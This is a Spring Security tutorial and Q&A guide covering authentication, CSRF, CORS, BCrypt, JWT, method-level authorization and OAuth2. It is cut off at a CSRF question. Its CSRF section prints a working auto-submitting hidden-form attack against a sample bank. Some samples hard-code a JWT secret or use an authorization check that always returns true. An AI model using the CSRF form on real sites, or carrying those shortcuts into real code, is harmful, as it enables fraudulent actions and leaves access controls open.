## [**..**](./00_index.md)

## **Spring Security - Authentication & Authorization**
---

### **1. Core Concepts of Spring Security**

**Authentication vs Authorization :**
- **Authentication** : "Who are you?" - Verifying the user's identity (login/password, token, etc.)
- **Authorization** : "What can you do?" - Verifying the user's permissions and roles

**Spring Security Architecture :**
Spring Security works with a chain of **Security Filters** that intercept every HTTP request. The main components are :
- **SecurityFilterChain** : Configures the security filter chain
- **AuthenticationManager** : Manages the authentication process
- **UserDetailsService** : Loads user information from the data source
- **PasswordEncoder** : Encodes/verifies passwords

---

### **2. Default Spring Security Configuration**

**Default behavior :**
As soon as the Spring Security dependency is added, all routes are automatically protected :
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

Spring Security automatically generates :
- A login page (`/login`)
- A default user : `user`
- A random password displayed in the console logs
- CSRF protection enabled
- Security headers (X-Frame-Options, X-XSS-Protection)

---

### **3. Form Authentication vs Basic Authentication**

#### **Form Authentication**
Authentication via HTML form, ideal for traditional web applications.

**Characteristics :**
- Customizable login page
- Session cookie to maintain authentication
- Redirect after login
- Remember-me functionality

**Configuration :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .formLogin(form -> form
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard")
                .permitAll()
            );
        
        return http.build();
    }
}
```

#### **Basic Authentication**
Authentication via HTTP header `Authorization: Basic base64(username:password)`

**Characteristics :**
- No session, stateless by nature
- Credentials sent with every request
- Suitable for REST APIs
- **Must be used with HTTPS** since credentials are base64-encoded (easily decodable)

**Configuration :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .anyRequest().authenticated()
        )
        .httpBasic(Customizer.withDefaults())
        .csrf(csrf -> csrf.disable()); // For REST API
    
    return http.build();
}
```

**Example request :**
```bash
curl -u username:password http://localhost:8080/api/users
# Or with header
curl -H "Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=" http://localhost:8080/api/users
```

---

### **4. CSRF (Cross-Site Request Forgery)**

**What is CSRF ?**
CSRF is an attack where a malicious website tricks an authenticated user into performing an unwanted action on a trusted site.

**Example attack :**
1. The user logs into `bank.com` (active session)
2. They visit `malicious.com` which contains a hidden form :
```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker-account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```
3. Without CSRF protection, the request is executed with the user's credentials

**CSRF protection in Spring Security :**
Spring Security generates a unique **CSRF token** per session that must be included in all mutating requests (POST, PUT, DELETE).

**Configuration for web application (CSRF enabled) :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(Customizer.withDefaults()) // Enabled by default
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
    
    return http.build();
}
```

**In the HTML form :**
```html
<form method="POST" action="/api/users">
    <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
    <!-- Or with Thymeleaf -->
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
</form>
```

**Configuration for REST API (CSRF disabled) :**
For **stateless** REST APIs (JWT, Basic Auth), CSRF is not needed because there are no session cookies :
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable()) // Disable for REST API
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        )
        .httpBasic(Customizer.withDefaults());
    
    return http.build();
}
```

**Rule :** 
- ✅ CSRF enabled : web applications with sessions
- ❌ CSRF disabled : stateless REST APIs (JWT, Basic Auth without session)

---

### **5. CORS (Cross-Origin Resource Sharing)**

**Problem :**
By default, browsers block AJAX requests to a different domain (Same-Origin policy).

**Example :**
- Frontend on `http://localhost:3000` (React)
- Backend on `http://localhost:8080` (Spring Boot)
- ❌ Request blocked by CORS

**CORS configuration in Spring Security :**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
        
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(Arrays.asList("http://localhost:3000"));
        configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        configuration.setAllowedHeaders(Arrays.asList("*"));
        configuration.setAllowCredentials(true);
        configuration.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

**Or with @CrossOrigin annotation :**
```java
@RestController
@CrossOrigin(origins = "http://localhost:3000")
public class UserController {
    @GetMapping("/api/users")
    public List<User> getUsers() { ... }
}
```

---

### **6. Storing User Credentials**

#### **In-Memory (for dev/test only)**
```java
@Bean
public UserDetailsService userDetailsService() {
    UserDetails user = User.builder()
        .username("john")
        .password(passwordEncoder().encode("password123"))
        .roles("USER")
        .build();
    
    UserDetails admin = User.builder()
        .username("admin")
        .password(passwordEncoder().encode("admin123"))
        .roles("ADMIN")
        .build();
    
    return new InMemoryUserDetailsManager(user, admin);
}
```

#### **JDBC (Database)**
**Configuration :**
```java
@Configuration
public class SecurityConfig {
    
    @Autowired
    private DataSource dataSource;
    
    @Bean
    public UserDetailsService userDetailsService() {
        JdbcUserDetailsManager manager = new JdbcUserDetailsManager(dataSource);
        
        // Spring Security uses these tables by default
        // users(username, password, enabled)
        // authorities(username, authority)
        
        return manager;
    }
}
```

**SQL Schema (standard Spring Security tables) :**
```sql
CREATE TABLE users (
    username VARCHAR(50) PRIMARY KEY,
    password VARCHAR(100) NOT NULL,
    enabled BOOLEAN NOT NULL
);

CREATE TABLE authorities (
    username VARCHAR(50) NOT NULL,
    authority VARCHAR(50) NOT NULL,
    FOREIGN KEY (username) REFERENCES users(username)
);
```

#### **Custom UserDetailsService (recommended in production)**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
        
        return org.springframework.security.core.userdetails.User.builder()
            .username(user.getUsername())
            .password(user.getPassword())
            .roles(user.getRoles().toArray(new String[0]))
            .build();
    }
}
```

---

### **7. Encoding vs Hashing vs Encryption**

**Critical differences :**

| Concept | Reversible ? | Usage | Example |
|---------|-------------|-------|---------|
| **Encoding** | ✅ Yes (decodable) | Data representation | Base64, URL encoding |
| **Hashing** | ❌ No (one-way) | Password storage | BCrypt, SHA-256 |
| **Encryption** | ✅ Yes (with key) | Protecting sensitive data | AES, RSA |

**Encoding (Base64) :**
```java
String original = "password123";
String encoded = Base64.getEncoder().encodeToString(original.getBytes());
// cGFzc3dvcmQxMjM=
String decoded = new String(Base64.getDecoder().decode(encoded));
// password123 ⚠️ Easily reversible !
```

**Hashing (BCrypt) - RECOMMENDED for passwords :**
```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(); // Strength 10 by default
}

// Usage
String rawPassword = "password123";
String hashedPassword = passwordEncoder.encode(rawPassword);
// $2a$10$XYZ... (60 characters, includes salt)

boolean matches = passwordEncoder.matches("password123", hashedPassword);
// true
```

**Why BCrypt ?**
- ✅ **Automatic salt** : every hash is unique even for the same password
- ✅ **Configurable strength** : slows down brute-force attacks
- ✅ **One-way** : impossible to recover the original password
- ✅ **Resistant to rainbow tables**

**Configuration with BCrypt :**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12); // Strength 12 (more secure, slower)
    }
    
    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.builder()
            .username("john")
            .password(passwordEncoder().encode("password123"))
            .roles("USER")
            .build();
        
        return new InMemoryUserDetailsManager(user);
    }
}
```

**Encryption (AES) - for sensitive non-password data :**
```java
// For data that needs to be decrypted later (card numbers, etc.)
// ⚠️ NEVER use for passwords !
```

---

### **8. JWT (JSON Web Token) Authentication**

**What is JWT ?**
JWT is a standard for creating **secure and self-contained access tokens** for stateless REST APIs.

**JWT Structure :**
```
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huIn0.xyz123
```

**Components :**
1. **Header** : Token type and signature algorithm
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

2. **Payload** : Claims (user data)
```json
{
  "sub": "john",
  "roles": ["USER"],
  "iat": 1516239022,
  "exp": 1516242622
}
```

3. **Signature** : Guarantees integrity
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**JWT Authentication Flow :**
```
1. Client → POST /auth/login {username, password}
2. Server → Validate credentials
3. Server → Generate JWT token
4. Server → Response {token: "eyJhbGc..."}
5. Client → Store token (localStorage, sessionStorage)
6. Client → GET /api/users + Header: Authorization: Bearer eyJhbGc...
7. Server → Validate JWT signature & expiration
8. Server → Extract user info from token
9. Server → Response {users: [...]}
```

**JWT implementation with Spring Security :**

**Dependencies :**
```xml
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.11.5</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.11.5</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.11.5</version>
    <scope>runtime</scope>
</dependency>
```

**JwtUtil - Service to manage JWT :**
```java
@Component
public class JwtUtil {
    
    @Value("${jwt.secret}")
    private String secret;
    
    @Value("${jwt.expiration}")
    private Long expiration; // 86400000 = 24h
    
    private Key getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secret);
        return Keys.hmacShaKeyFor(keyBytes);
    }
    
    public String generateToken(String username) {
        Map<String, Object> claims = new HashMap<>();
        return Jwts.builder()
            .setClaims(claims)
            .setSubject(username)
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
            .compact();
    }
    
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }
    
    public Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }
    
    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token);
        return claimsResolver.apply(claims);
    }
    
    private Claims extractAllClaims(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(getSigningKey())
            .build()
            .parseClaimsJws(token)
            .getBody();
    }
    
    public Boolean isTokenExpired(String token) {
        return extractExpiration(token).before(new Date());
    }
    
    public Boolean validateToken(String token, UserDetails userDetails) {
        final String username = extractUsername(token);
        return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
    }
}
```

**JwtAuthenticationFilter - Filter to validate JWT :**
```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                    HttpServletResponse response, 
                                    FilterChain filterChain) 
            throws ServletException, IOException {
        
        final String authHeader = request.getHeader("Authorization");
        
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);
            return;
        }
        
        try {
            final String jwt = authHeader.substring(7);
            final String username = jwtUtil.extractUsername(jwt);
            
            if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                
                if (jwtUtil.validateToken(jwt, userDetails)) {
                    UsernamePasswordAuthenticationToken authToken = 
                        new UsernamePasswordAuthenticationToken(
                            userDetails,
                            null,
                            userDetails.getAuthorities()
                        );
                    
                    authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                    SecurityContextHolder.getContext().setAuthentication(authToken);
                }
            }
        } catch (Exception e) {
            logger.error("Cannot set user authentication: {}", e.getMessage());
        }
        
        filterChain.doFilter(request, response);
    }
}
```

**Security Configuration with JWT :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private JwtAuthenticationFilter jwtAuthFilter;
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**", "/public/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
    
    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) 
            throws Exception {
        return config.getAuthenticationManager();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

**Authentication Controller :**
```java
@RestController
@RequestMapping("/auth")
public class AuthController {
    
    @Autowired
    private AuthenticationManager authenticationManager;
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        try {
            authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    request.getUsername(),
                    request.getPassword()
                )
            );
        } catch (BadCredentialsException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(new ErrorResponse("Invalid credentials"));
        }
        
        final UserDetails userDetails = userDetailsService.loadUserByUsername(request.getUsername());
        final String jwt = jwtUtil.generateToken(userDetails.getUsername());
        
        return ResponseEntity.ok(new AuthResponse(jwt));
    }
}

@Data
class LoginRequest {
    private String username;
    private String password;
}

@Data
@AllArgsConstructor
class AuthResponse {
    private String token;
}
```

**Client-side usage example :**
```javascript
// Login
fetch('http://localhost:8080/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'john', password: 'password123' })
})
.then(res => res.json())
.then(data => {
  localStorage.setItem('token', data.token); // Store the token
});

// Protected request
fetch('http://localhost:8080/api/users', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
})
.then(res => res.json())
.then(users => console.log(users));
```

**application.properties configuration :**
```properties
# JWT Configuration
jwt.secret=mySecretKeyForJwtTokenGenerationMustBe256BitsLongForHS256Algorithm
jwt.expiration=86400000
```

**⚠️ JWT Security :**
- Secret key must be complex (256+ bits for HS256)
- Use HTTPS in production
- Reasonable expiration (15min - 24h)
- Refresh tokens to extend session
- Store token on client side securely (avoid localStorage if XSS risk)

---

### **9. Authorization - Method-Level Security**

**Available annotations :**

#### **@EnableMethodSecurity (Spring Boot 3+)**
Enables method-level security :
```java
@Configuration
@EnableMethodSecurity(
    prePostEnabled = true,      // Enables @PreAuthorize, @PostAuthorize
    securedEnabled = true,       // Enables @Secured
    jsr250Enabled = true         // Enables @RolesAllowed
)
public class SecurityConfig { }
```

#### **@PreAuthorize - Check BEFORE execution**
```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    
    @GetMapping
    @PreAuthorize("hasRole('USER')")
    public List<User> getAllUsers() {
        return userService.findAll();
    }
    
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
    
    // Complex SpEL expressions
    @PutMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    public User updateUser(@PathVariable Long id, @RequestBody User user) {
        return userService.update(id, user);
    }
    
    @GetMapping("/{id}")
    @PreAuthorize("@userSecurity.canAccessUser(#id)")
    public User getUser(@PathVariable Long id) {
        return userService.findById(id);
    }
}

// Custom security expression
@Component("userSecurity")
public class UserSecurity {
    public boolean canAccessUser(Long userId) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        // Custom logic
        return true;
    }
}
```

#### **@PostAuthorize - Check AFTER execution**
```java
@GetMapping("/{id}")
@PostAuthorize("returnObject.username == authentication.principal.username")
public User getUser(@PathVariable Long id) {
    return userService.findById(id);
}
```

#### **@Secured - Spring-specific**
```java
@DeleteMapping("/{id}")
@Secured("ROLE_ADMIN") // Requires "ROLE_" prefix
public void deleteUser(@PathVariable Long id) {
    userService.delete(id);
}

@GetMapping
@Secured({"ROLE_USER", "ROLE_ADMIN"}) // OR logic
public List<User> getUsers() {
    return userService.findAll();
}
```

#### **@RolesAllowed - Java EE standard**
```java
@DeleteMapping("/{id}")
@RolesAllowed("ADMIN") // No "ROLE_" prefix
public void deleteUser(@PathVariable Long id) {
    userService.delete(id);
}

@GetMapping
@RolesAllowed({"USER", "ADMIN"})
public List<User> getUsers() {
    return userService.findAll();
}
```

**Comparison :**

| Annotation | Standard | ROLE_ prefix | SpEL Support | Recommendation |
|-----------|----------|---------------|--------------|----------------|
| **@PreAuthorize** | Spring | Not required | ✅ Yes (powerful) | **⭐ Recommended** |
| **@PostAuthorize** | Spring | Not required | ✅ Yes | Specific cases |
| **@Secured** | Spring | ✅ Required | ❌ No | Legacy |
| **@RolesAllowed** | Java EE | ❌ No | ❌ No | Java EE portability |

**My recommendation : @PreAuthorize** for its flexibility with SpEL.

---

### **10. OAuth2 - Login with Google**

**What is OAuth2 ?**
OAuth2 is an authorization protocol that allows an application to access a user's resources without exposing their credentials. Enables **"Login with Google/Facebook/GitHub"**.

**OAuth2 Flow (Authorization Code) :**
```
1. User → Click "Login with Google"
2. App → Redirect to Google Authorization Server
3. User → Login on Google + Accept permissions
4. Google → Redirect to App with authorization code
5. App → Exchange code for access token (backend)
6. Google → Return access token
7. App → Use token to fetch user info
8. App → Create session/JWT for user
```

**Configuration Spring Boot + OAuth2 :**

**Dependencies :**
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
```

**application.properties :**
```properties
# Google OAuth2
spring.security.oauth2.client.registration.google.client-id=YOUR_CLIENT_ID
spring.security.oauth2.client.registration.google.client-secret=YOUR_CLIENT_SECRET
spring.security.oauth2.client.registration.google.scope=profile,email
spring.security.oauth2.client.registration.google.redirect-uri={baseUrl}/login/oauth2/code/{registrationId}

# GitHub OAuth2 (optional)
spring.security.oauth2.client.registration.github.client-id=YOUR_GITHUB_CLIENT_ID
spring.security.oauth2.client.registration.github.client-secret=YOUR_GITHUB_CLIENT_SECRET
```

**Security Configuration :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login", "/error").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard", true)
                .failureUrl("/login?error=true")
            );
        
        return http.build();
    }
}
```

**Controller :**
```java
@Controller
public class HomeController {
    
    @GetMapping("/")
    public String home() {
        return "home";
    }
    
    @GetMapping("/dashboard")
    public String dashboard(Model model, @AuthenticationPrincipal OAuth2User principal) {
        if (principal != null) {
            model.addAttribute("name", principal.getAttribute("name"));
            model.addAttribute("email", principal.getAttribute("email"));
            model.addAttribute("picture", principal.getAttribute("picture"));
        }
        return "dashboard";
    }
}
```

**Login Page (Thymeleaf) :**
```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<body>
    <h1>Login</h1>
    <a href="/oauth2/authorization/google">
        <button>Login with Google</button>
    </a>
    <a href="/oauth2/authorization/github">
        <button>Login with GitHub</button>
    </a>
</body>
</html>
```

**Getting Client ID/Secret on Google :**
1. Go to [Google Cloud Console](https://console.cloud.google.com/)
2. Create a project
3. APIs & Services → Credentials
4. Create OAuth 2.0 Client ID
5. Authorized redirect URIs : `http://localhost:8080/login/oauth2/code/google`

**Custom OAuth2 User Service (to save user to DB) :**
```java
@Service
public class CustomOAuth2UserService extends DefaultOAuth2UserService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public OAuth2User loadUser(OAuth2UserRequest userRequest) throws OAuth2AuthenticationException {
        OAuth2User oAuth2User = super.loadUser(userRequest);
        
        String email = oAuth2User.getAttribute("email");
        String name = oAuth2User.getAttribute("name");
        
        // Save or update user in DB
        User user = userRepository.findByEmail(email)
            .orElse(new User());
        user.setEmail(email);
        user.setName(name);
        user.setProvider("GOOGLE");
        userRepository.save(user);
        
        return oAuth2User;
    }
}
```

---

**Summary of mastered concepts :**

✅ **Authentication** : Form, Basic, JWT, OAuth2  
✅ **Authorization** : Method-level security (@PreAuthorize, @Secured, @RolesAllowed)  
✅ **CSRF & CORS** : Protection and configuration  
✅ **User Storage** : In-memory, JDBC, Custom UserDetailsService  
✅ **Password Security** : BCrypt hashing  
✅ **JWT** : Generation, validation, stateless authentication  
✅ **OAuth2** : Login with Google/GitHub  


---

## **Questions/Answers : Spring Security**

### **General Questions on Spring Security**

**Q1 : What is Spring Security and why use it ?**

**A :** Spring Security is a powerful and highly customizable framework for managing **authentication** (who are you?) and **authorization** (what can you do?) in Spring applications.

**Main features :**
- Protection against common attacks (CSRF, session fixation, clickjacking)
- Support for multiple authentication strategies (Form, Basic, JWT, OAuth2, LDAP)
- Fine-grained authorization at method and URL level
- Seamless integration with Spring Boot
- REST API protection

**Without Spring Security :** I would have to manually implement all the security logic, manage sessions, encode passwords, etc. This is complex and risky.

---

**Q2 : What is the difference between Authentication and Authorization ?**

**A :** 

**Authentication :**
- **Question :** "Who are you?"
- **Process :** Verifying the user's identity
- **Mechanisms :** Username/password, JWT token, OAuth2, biometrics
- **Example :** User logs in with `john/password123`

**Authorization :**
- **Question :** "What can you do?"
- **Process :** Verifying permissions/roles after authentication
- **Mechanisms :** Roles (ADMIN, USER), Permissions (READ, WRITE)
- **Example :** User `john` with role `USER` cannot access `/admin/**`

**Flow :**
```
1. Authentication → Verify credentials → Create Authentication object
2. Authorization → Verify roles/permissions → Allow or deny access
```

---

**Q3 : How does the Spring Security architecture work ?**

**A :** Spring Security uses a **Security Filter Chain** that intercepts every HTTP request.

**Main components :**

```
HTTP Request
    ↓
[DelegatingFilterProxy]
    ↓
[SecurityFilterChain] → Filter chain
    ├── SecurityContextPersistenceFilter
    ├── LogoutFilter
    ├── UsernamePasswordAuthenticationFilter (Form login)
    ├── BasicAuthenticationFilter (Basic Auth)
    ├── JwtAuthenticationFilter (Custom JWT)
    ├── ExceptionTranslationFilter
    └── FilterSecurityInterceptor (Authorization)
    ↓
[AuthenticationManager] → Manages authentication
    ↓
[AuthenticationProvider] → Validates credentials
    ↓
[UserDetailsService] → Loads user from DB/memory
    ↓
[PasswordEncoder] → Verifies password
    ↓
Controller
```

**Example flow :**
1. User sends `POST /login` with username/password
2. `UsernamePasswordAuthenticationFilter` intercepts
3. `AuthenticationManager` delegates to `AuthenticationProvider`
4. `UserDetailsService` loads the user from the DB
5. `PasswordEncoder` compares the passwords
6. If OK → `Authentication` object created and stored in `SecurityContext`
7. If KO → Exception thrown

---

**Q4 : What are SecurityContext and SecurityContextHolder ?**

**A :** 

**SecurityContext :**
- Contains authentication information for the current user
- Contains the `Authentication` object (principal, credentials, authorities)

**SecurityContextHolder :**
- Static holder that stores the `SecurityContext`
- Uses `ThreadLocal` by default (one context per thread)

**Usage :**
```java
// Get the authenticated user
Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
String username = authentication.getName();
Collection<? extends GrantedAuthority> authorities = authentication.getAuthorities();

// In a controller
@GetMapping("/me")
public String getCurrentUser() {
    Authentication auth = SecurityContextHolder.getContext().getAuthentication();
    return auth.getName(); // Username
}

// Or with injection
@GetMapping("/me")
public String getCurrentUser(@AuthenticationPrincipal UserDetails userDetails) {
    return userDetails.getUsername();
}
```

---

### **Questions on Default Configuration**

**Q5 : What happens when you add Spring Security without any configuration ?**

**A :** Spring Boot automatically enables a **default configuration** :

**Behavior :**
- ✅ All routes are protected (require authentication)
- ✅ Generates a default user : `user`
- ✅ Random password displayed in console logs :
```
Using generated security password: 8e557245-73e2-4286-969a-ff57fe326336
```
- ✅ Activates a login page `/login`
- ✅ CSRF protection enabled
- ✅ Session-based authentication
- ✅ Security headers (X-Frame-Options, X-XSS-Protection)

**To test :**
```bash
curl -u user:8e557245-73e2-4286-969a-ff57fe326336 http://localhost:8080/api/users
```

---

**Q6 : How to disable security for certain endpoints ?**

**A :** I use `requestMatchers().permitAll()` in the configuration :

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**", "/auth/**").permitAll()
                .requestMatchers("/h2-console/**").permitAll() // H2 database
                .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").permitAll() // Swagger
                .requestMatchers("/actuator/health").permitAll() // Health check
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
}
```

**Note :** Order matters! Rules are evaluated from top to bottom.

---

### **Questions on Form Authentication**

**Q7 : How does Form Authentication work in Spring Security ?**

**A :** Form Authentication is authentication via a classic HTML form.

**Flow :**
```
1. User accesses a protected resource → Redirected to /login
2. User fills the form (username/password)
3. POST /login → UsernamePasswordAuthenticationFilter intercepts
4. AuthenticationManager validates credentials
5. If OK → Create session cookie + Redirect to requested page
6. If KO → Redirect to /login?error=true
```

**Configuration :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/public/**").permitAll()
            .anyRequest().authenticated()
        )
        .formLogin(form -> form
            .loginPage("/login")              // Custom login page
            .loginProcessingUrl("/perform_login") // POST URL
            .defaultSuccessUrl("/dashboard", true) // After successful login
            .failureUrl("/login?error=true")  // After failure
            .usernameParameter("email")       // Field name (default: username)
            .passwordParameter("pwd")         // Field name (default: password)
            .permitAll()
        )
        .logout(logout -> logout
            .logoutUrl("/logout")
            .logoutSuccessUrl("/login?logout=true")
            .invalidateHttpSession(true)
            .deleteCookies("JSESSIONID")
            .permitAll()
        );
    
    return http.build();
}
```

**HTML Form (Thymeleaf) :**
```html
<form method="POST" th:action="@{/perform_login}">
    <input type="text" name="email" placeholder="Email" required>
    <input type="password" name="pwd" placeholder="Password" required>
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
    <button type="submit">Login</button>
</form>
<div th:if="${param.error}">
    Invalid credentials
</div>
```

---

**Q8 : What is the difference between Form Authentication and Basic Authentication ?**

**A :** 

| Aspect | Form Authentication | Basic Authentication |
|--------|---------------------|---------------------|
| **Interface** | HTML Form | HTTP Header |
| **State** | Stateful (session) | Stateless (no session) |
| **Usage** | Web applications | REST APIs |
| **Security** | Session cookie | Credentials on every request |
| **User Experience** | Better (customizable page) | Basic browser popup |
| **HTTPS** | Recommended | **Required** |

**Form Authentication :** For web applications with a user interface.

**Basic Authentication :** For REST APIs, microservices, scripts.

---

### **Questions on Basic Authentication**

**Q9 : How does Basic Authentication work ?**

**A :** Basic Authentication sends credentials encoded in Base64 in the HTTP `Authorization` header.

**Format :**
```
Authorization: Basic base64(username:password)
```

**Example :**
```bash
# Credentials: john:password123
# Base64: am9objpwYXNzd29yZDEyMw==

curl -H "Authorization: Basic am9objpwYXNzd29yZDEyMw==" \
     http://localhost:8080/api/users

# Or with curl -u
curl -u john:password123 http://localhost:8080/api/users
```

**⚠️ Warning :**
- Base64 is **easily decodable** (no encryption)
- **HTTPS required** in production
- Credentials sent with **every request** (no session)

---

**Q10 : How to configure Basic Authentication in Spring Security ?**

**A :** 

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .httpBasic(Customizer.withDefaults()) // Enable Basic Auth
            .csrf(csrf -> csrf.disable()) // Disable CSRF for REST API
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS) // No session
            );
        
        return http.build();
    }
    
    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.builder()
            .username("john")
            .password(passwordEncoder().encode("password123"))
            .roles("USER")
            .build();
        
        return new InMemoryUserDetailsManager(user);
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

---

**Q11 : Why disable CSRF for Basic Authentication ?**

**A :** 

**CSRF (Cross-Site Request Forgery)** protects against attacks where a malicious site executes actions on behalf of an authenticated user.

**CSRF requires :**
- **Cookie/session-based** authentication
- The browser automatically sends the cookie with every request

**Basic Authentication :**
- **Stateless** : no session, no cookie
- Credentials in the **Authorization header** (not automatically sent by the browser)
- Impossible for a malicious site to forge a request with the Authorization header

**Therefore :** CSRF protection is **not needed** and can be disabled for stateless REST APIs.

**Exception :** If you use Basic Auth with sessions (not recommended), keep CSRF enabled.

---

### **Questions on CSRF**

**Q12 : What is CSRF and how does the attack work ?**

